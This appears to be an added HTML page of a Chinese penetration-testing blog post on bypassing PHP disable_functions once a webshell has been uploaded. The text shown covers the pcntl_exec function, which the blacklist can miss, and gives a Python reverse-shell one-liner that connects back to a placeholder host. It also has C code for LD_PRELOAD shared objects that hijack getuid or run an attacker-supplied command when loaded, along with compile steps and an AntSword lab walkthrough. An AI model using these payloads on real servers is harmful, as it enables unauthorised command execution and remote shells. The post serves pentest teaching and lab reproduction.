@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>常见Bypass Disable Functions方法 - Geekby&#39;s Blog</title><meta name="Description" content="常见 Bypass Disable Functions 方法总结"><meta property="og:title" content="常见Bypass Disable Functions方法" />
+<meta property="og:description" content="常见 Bypass Disable Functions 方法总结" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-08-30T18:00:00+08:00" />
+<meta property="article:modified_time" content="2021-09-03T19:00:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="常见Bypass Disable Functions方法"/>
+<meta name="twitter:description" content="常见 Bypass Disable Functions 方法总结"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/" /><link rel="prev" href="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/" /><link rel="next" href="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "常见Bypass Disable Functions方法",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2021\/08\/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试","wordcount":  1183 ,
+        "url": "https:\/\/www.geekby.site\/2021\/08\/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95\/","datePublished": "2021-08-30T18:00:00+08:00","dateModified": "2021-09-03T19:00:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "常见 Bypass Disable Functions 方法总结"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">常见Bypass Disable Functions方法</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-30">2021-08-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1183 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-背景">1 背景</a></li>
+    <li><a href="#2-黑名单绕过">2 黑名单绕过</a></li>
+    <li><a href="#3-利用-ld_preload-环境变量">3 利用 LD_PRELOAD 环境变量</a>
+      <ul>
+        <li><a href="#31-原理">3.1 原理</a></li>
+        <li><a href="#32-劫持函数uid">3.2 劫持函数(uid)</a>
+          <ul>
+            <li><a href="#321-原理">3.2.1 原理</a></li>
+            <li><a href="#322-利用">3.2.2 利用</a></li>
+          </ul>
+        </li>
+        <li><a href="#33-劫持启动进程">3.3 劫持启动进程</a>
+          <ul>
+            <li><a href="#331-__attribute__-介绍">3.3.1 __attribute__ 介绍</a></li>
+            <li><a href="#322-利用-1">3.2.2 利用</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#4-利用破壳漏洞--shellshock">4 利用「破壳漏洞」- ShellShock</a>
+      <ul>
+        <li><a href="#41-前提">4.1 前提</a></li>
+        <li><a href="#42-原理">4.2 原理</a></li>
+        <li><a href="#43-利用">4.3 利用</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-利用-cgi">5 利用 CGI</a>
+      <ul>
+        <li><a href="#51-apache-mod-cgi">5.1 Apache Mod CGI</a>
+          <ul>
+            <li><a href="#511-前提">5.1.1 前提</a></li>
+            <li><a href="#512-原理">5.1.2 原理</a></li>
+            <li><a href="#513-利用">5.1.3 利用</a></li>
+          </ul>
+        </li>
+        <li><a href="#52-php-fpm">5.2 PHP-fpm</a>
+          <ul>
+            <li><a href="#521-前提">5.2.1 前提</a></li>
+            <li><a href="#522-原理">5.2.2 原理</a></li>
+            <li><a href="#523-利用">5.2.3 利用</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#6-利用-uaf-bypass">6 利用 UAF Bypass</a>
+      <ul>
+        <li><a href="#61-gc-uaf">6.1 GC UAF</a>
+          <ul>
+            <li><a href="#611-前提">6.1.1 前提</a></li>
+            <li><a href="#612-原理">6.1.2 原理</a></li>
+            <li><a href="#613-利用">6.1.3 利用</a></li>
+          </ul>
+        </li>
+        <li><a href="#62-json-serializer-uaf">6.2 Json Serializer UAF</a>
+          <ul>
+            <li><a href="#621-前提">6.2.1 前提</a></li>
+            <li><a href="#622-原理">6.2.2 原理</a></li>
+            <li><a href="#623-利用">6.2.3 利用</a></li>
+          </ul>
+        </li>
+        <li><a href="#63-backtrace-uaf">6.3 Backtrace UAF</a>
+          <ul>
+            <li><a href="#631-前提">6.3.1 前提</a></li>
+            <li><a href="#632-原理">6.3.2 原理</a></li>
+          </ul>
+        </li>
+        <li><a href="#64-spldoublylinkedlist-uaf">6.4 SplDoublyLinkedList UAF</a>
+          <ul>
+            <li><a href="#641-前提">6.4.1 前提</a></li>
+            <li><a href="#642-原理">6.4.2 原理</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#7-利用-ffi-扩展执行命令">7 利用 FFI 扩展执行命令</a>
+      <ul>
+        <li><a href="#71-前提">7.1 前提</a></li>
+        <li><a href="#72-原理">7.2 原理</a></li>
+        <li><a href="#73-利用">7.3 利用</a></li>
+      </ul>
+    </li>
+    <li><a href="#8-利用-imagemagick">8 利用 ImageMagick</a>
+      <ul>
+        <li><a href="#81-前提">8.1 前提</a></li>
+        <li><a href="#82-原理">8.2 原理</a></li>
+        <li><a href="#83-利用">8.3 利用</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="常见-bypass-disable-functions-方法总结">常见 Bypass Disable Functions 方法总结</h1>
+<h2 id="1-背景">1 背景</h2>
+<p><code>PHP.ini</code> 中可以设置禁用一些危险函数，例如 eval、exec、system 等，将其写在 php.ini 配置文件中，就是我们所说的 <code>disable_functions</code> 了，特别是虚拟主机运营商，为了彻底隔离同服务器的客户，以及避免出现大面积的安全问题，在 disable_functions 的设置中也通常较为严格。</p>
+<p>如果在渗透时，上传了 webshell 却因为 disable_functions 禁用了函数而无法执行命令，这时候就需要想办法进行绕过，突破 disable_functions。</p>
+<h2 id="2-黑名单绕过">2 黑名单绕过</h2>
+<p>即便是通过 disable functions 限制危险函数，也可能会有限制不全的情况。可以执行命令的哈函数可以参考：<a href="https://www.leavesongs.com/PENETRATION/dynamic-features-and-webshell-tricks-in-php.html" target="_blank" rel="noopener noreffer">PHP webshell 检测</a>。还有一个比较常见的易被忽略的函数就是 <code>pcntl_exec</code>。</p>
+<blockquote>
+<p>pcntl 是 linux 下的一个扩展，可以支持 php 的多线程操作。很多时候会碰到禁用 exec 函数的情况，但如果运维人员安全意识不强或对 PHP 不甚了解，则很有可能忽略 pcntl 扩展的相关函数。</p>
+</blockquote>
+<p>使用 <code>pcntl_exec</code> 的前提是开启了 <code>pcntl</code> 插件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;pcntl_exec&#39;</span><span class="p">))</span> <span class="p">{</span>
+   <span class="nx">pcntl_exec</span><span class="p">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;/tmp/test.sh&#34;</span><span class="p">));</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+       <span class="k">echo</span> <span class="s1">&#39;pcntl extension is not support!&#39;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>由于 <code>pcntl_exec()</code> 执行命令是没有回显的，所以其常与 python 结合来反弹 shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">pcntl_exec</span><span class="p">(</span><span class="s2">&#34;/usr/bin/python&#34;</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span><span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&#34;IP&#34;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span><span class="p">));</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><a href="https://whoamianony.top/2020/12/21/CTF%e6%af%94%e8%b5%9b%e8%ae%b0%e5%bd%95/%e7%ac%ac%e5%9b%9b%e5%b1%8a%e2%80%9c%e8%93%9d%e5%b8%bd%e6%9d%af%e2%80%9d%e5%85%a8%e5%9b%bd%e5%a4%a7%e5%ad%a6%e7%94%9f%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8%e6%8a%80%e8%83%bd%e5%a4%a7%e8%b5%9b%e5%86%b3%e8%b5%9bWriteUp/#php" target="_blank" rel="noopener noreffer">蓝帽杯决赛</a>中存在相关利用方式。</p>
+<h2 id="3-利用-ld_preload-环境变量">3 利用 LD_PRELOAD 环境变量</h2>
+<h3 id="31-原理">3.1 原理</h3>
+<p><code>LD_PRELOAD</code> 是 Linux 系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它可以在用户的程序运行前优先加载该动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，可以利用此功能来使用自定义的函数，而另一方面，可以向别人的程序注入程序，从而达到特定的攻击目的。</p>
+<p>前提：</p>
+<ul>
+<li>能够上传 <code>.so</code> 文件</li>
+<li>能够控制 <code>LD_PRELOAD</code> 环境变量的值，比如 <code>putenv()</code> 函数</li>
+<li>因为新进程启动将加载 <code>LD_PRELOAD</code> 中的 <code>.so</code> 文件，所以要存在可以控制 PHP 启动外部程序的函数并能执行，比如 <code>mail()</code>、<code>imap_mail()</code>、<code>mb_send_mail()</code> 和 <code>error_log()</code> 函数等</li>
+</ul>
+<p>下面介绍两种常用的利用方式。</p>
+<h3 id="32-劫持函数uid">3.2 劫持函数(uid)</h3>
+<h4 id="321-原理">3.2.1 原理</h4>
+<ul>
+<li>编写一个原型为 <code>uid_t getuid(void);</code> 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 <code>getuid_shadow.so</code>；</li>
+<li>运行 PHP 函数 <code>putenv()</code>（用来配置系统环境变量），设定环境变量 <code>LD_PRELOAD</code> 为 <code>getuid_shadow.so</code>，以便后续启动新进程时优先加载该共享对象；</li>
+<li>运行 PHP 的 <code>mail()</code> 函数，<code>mail()</code> 内部启动新进程 <code>/usr/sbin/sendmail</code>，由于上一步 <code>LD_PRELOAD</code> 的作用，<code>sendmail</code> 调用的系统函数 <code>getuid()</code> 被优先级更好的 <code>getuid_shadow.so</code> 中的同名 <code>getuid()</code> 所劫持；达到不调用 PHP 的各种命令执行函数（<code>system</code>、<code>exec</code> 等等）仍可执行系统命令的目的。</li>
+</ul>
+<h4 id="322-利用">3.2.2 利用</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="kt">void</span> <span class="nf">payload</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">&#34;ls &gt; /tmp/leon&#34;</span><span class="p">);</span>
+<span class="p">}</span>   
+<span class="kt">int</span> <span class="nf">getuid</span><span class="p">()</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
+  <span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+	<span class="n">payload</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>编译成 so 文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc -c -fPIC exp.c -o hack <span class="o">&amp;&amp;</span> gcc --share hack -o exp.so
+</code></pre></td></tr></table>
+</div>
+</div><p>编写 test.php：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;LD_PRELOAD=./exp.so&#34;</span><span class="p">);</span>
+<span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>但是，在真实环境中，存在两方面问题：</p>
+<ul>
+<li>一是，某些环境中，<code>web</code> 禁止启用 <code>sendmail</code>、甚至系统上根本未安装 <code>sendmail</code>，也就谈不上劫持 <code>getuid()</code>，通常的 <code>www-data</code> 权限又不可能去更改 <code>php.ini</code> 配置、去安装 <code>sendmail</code> 软件；</li>
+<li>二是，即便目标可以启用 <code>sendmail</code>，由于未将主机名（hostname 输出）添加进 <code>hosts</code> 中，导致每次运行 <code>sendmail</code> 都要耗时半分钟等待域名解析超时返回，<code>www-data</code> 也无法将主机名加入 <code>hosts</code>。</li>
+</ul>
+<p>基于这两种方式，衍生出一种新的利用方式。</p>
+<h3 id="33-劫持启动进程">3.3 劫持启动进程</h3>
+<p>回到 <code>LD_PRELOAD</code> 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那就完全可以不依赖 <code>sendmail</code> 了。</p>
+<h4 id="331-__attribute__-介绍">3.3.1 __attribute__ 介绍</h4>
+<p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。</p>
+<h4 id="322-利用-1">3.2.2 利用</h4>
+<p>简单的 exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="n">preload</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;whoami &gt; /tmp/leon&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>但是<code>unsetenv()</code>在 Centos 上无效，因为 Centos 自己也hook了 <code>unsetenv()</code>，在其内部启动了其他进程，来不及删除 <code>LD_PRELOAD</code> 就又被劫持，导致无限循环，可以使用全局变量 <code>extern char** environ</code>删除，实际上，<code>unsetenv() </code> 就是对 environ 的简单封装实现的环境变量删除功能。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="k">extern</span> <span class="kt">char</span><span class="o">**</span> <span class="n">environ</span><span class="p">;</span>
+<span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="n">preload</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// get command line options and arg
+</span><span class="c1"></span>    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cmdline</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;EVIL_CMDLINE&#34;</span><span class="p">);</span>
+    <span class="c1">// unset environment variable LD_PRELOAD.
+</span><span class="c1"></span>    <span class="c1">// unsetenv(&#34;LD_PRELOAD&#34;) no effect on some 
+</span><span class="c1"></span>    <span class="c1">// distribution (e.g., centos), I need crafty trick.
+</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+            <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="c1">// executive command
+</span><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="n">cmdline</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>使用 for 循环修改 <code>LD_PRELOAD</code> 的首个字符改成 <code>\0</code>，<code>\0 </code>是 C 语言字符串结束标记，这样可以让系统原有的 <code>LD_PRELOAD</code> 环境变量自动失效。</p>
+<p>编译：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc -c -fPIC exp.c -o hack <span class="o">&amp;&amp;</span> gcc --share hack -o exp.so
+</code></pre></td></tr></table>
+</div>
+</div><p>详情可见：<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener noreffer">bypass_disablefunc_via_LD_PRELOAD</a>。</p>
+<p>在 <a href="https://github.com/AntSwordProject/AntSword-Labs" target="_blank" rel="noopener noreffer">AntSword-Labs</a> 有相关环境，复现该漏洞。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312125514.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312125514.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312125514.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312125514.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312125514.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312125514.png-water_print" /></p>
+<p>尝试执行命令：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print" /></p>
+<p>使用 <code>LD_PRELOAD</code> 插件绕过：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312127984.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312127984.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312127984.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312127984.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312127984.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312127984.png-water_print" /></p>
+<p>成功后可以看到 <code>/var/www/html/</code> 目录下新建了一个 <code>.antproxy.php</code> 文件。我们创建副本, 并将连接的 URL shell 脚本名字改为 <code>.antproxy.php</code>，就可以成功执行命令。</p>
